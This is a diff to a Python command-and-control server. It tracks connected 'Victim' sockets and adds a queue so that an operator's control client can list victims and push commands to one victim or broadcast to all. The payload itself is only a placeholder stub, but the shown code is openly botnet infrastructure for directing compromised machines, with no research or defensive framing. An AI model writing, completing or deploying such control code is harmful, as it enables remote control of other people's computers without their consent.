@@ -8,6 +8,8 @@ from Crypto.Cipher import PKCS1_v1_5
 from Crypto.Cipher import AES
 import base64
 import json
+import queue 
+
 
 print = functools.partial(print, flush=True)
 
@@ -17,6 +19,7 @@ threadList = []
 class Victim(Thread):
     def __init__(self,clSock):
         Thread.__init__(self)
+        self.q = queue.Queue()
         self.conn = clSock
         self.OTPPacketLen = int.from_bytes(self.conn.recv(8),byteorder='big',signed=False)
         if(self.conn.send(b"\x01") != 1):
@@ -77,6 +80,11 @@ class Victim(Thread):
     def get_name(self):
         return str(self.conn.getpeername()) 
         
+    def addCommandToQueue(self,command):
+        self.q.put(command)
+
+    def getCommandFromQueue(self):
+        return self.q.get() 
     def run(self):
         print("Payload Placeholder Stub")
 
@@ -128,12 +136,25 @@ class CTRLClient(Thread):
 
     def run(self):
         jsonArray = []
-        for t in threadList:
-            jsonArray.append(t.get_name())
-        jsonObj = {}
-        jsonObj["VictimsArray"] = jsonArray
-        self.sendStr(json.dumps(jsonObj))
-       
+        while True:
+            command = json.loads(self.recvStr())
+            if command["Target"] == str(self.conn.getsockname()):
+                if str(command["Command"]) == "List Connections":
+                    for t in threadList:
+                        jsonArray.append(t.get_name())
+                    jsonObj = {}
+                    jsonObj["VictimsArray"] = jsonArray
+                    self.sendStr(json.dumps(jsonObj))
+            elif command["Target"] == "*":
+                for t in threadList:
+                    t.addCommandToQueue(str(command["Command"]))
+            else:
+                for t in threadList:
+                    if str(command["Target"]) == t.get_name():
+                        t.addCommandToQueue(str(command["Command"]))
+
+
+
 class CTRLThread(Thread):
 
     def __init__(self):
@@ -149,7 +170,7 @@ class CTRLThread(Thread):
 
     def run(self):
         while True:
-            print ("Here")
+            
             cl, addr = self.svr.accept()
             c = CTRLClient(cl) 
             c.setName("CTRLClient")
